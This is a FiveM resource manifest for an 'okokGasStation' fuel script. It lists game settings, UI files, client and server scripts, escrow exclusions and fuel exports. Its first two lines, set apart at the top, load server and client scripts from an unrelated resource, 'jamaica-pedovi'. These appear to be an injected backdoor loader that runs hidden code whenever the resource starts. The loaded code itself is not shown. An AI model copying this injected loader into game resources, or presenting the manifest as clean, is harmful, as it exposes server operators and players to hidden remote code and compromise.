server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version 'cerulean'

game 'gta5'

author 'okok#3488'
description 'okokGasStation'
version '1.1.0'

ui_page 'web/ui.html'

files {
	'web/*.*',
	'web/img/*.png',
}

shared_script 'config.lua'

client_scripts {
	'locales/*.lua',
	'cl_utils.lua',
	'client.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'locales/*.lua',
	'sv_utils.lua',
	'server.lua'
}

lua54 'yes'

escrow_ignore {
	'config.lua',
	'sv_utils.lua',
	'cl_utils.lua',
	'locales/*.lua',
}

exports {
	'GetFuel',
	'SetFuel'
}
dependency '/assetpacks'
